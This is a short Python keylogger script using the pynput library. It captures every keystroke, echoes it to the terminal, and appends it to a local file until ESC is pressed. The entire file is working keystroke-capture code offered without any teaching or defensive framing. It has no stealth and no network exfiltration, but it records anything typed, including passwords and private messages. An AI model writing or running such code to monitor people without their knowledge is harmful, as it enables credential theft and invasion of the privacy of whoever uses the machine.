from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key}]"

    # Print to terminal
    print(char, end='', flush=True)

    # Save to file
    with open(log_file, "a", encoding="utf-8") as f:
        if key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.enter:
            f.write("\n")
        else:
            f.write(char)
        f.flush()

def on_release(key):
    if key == keyboard.Key.esc:  # stop logger with ESC
        print("\nStopping keylogger...")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
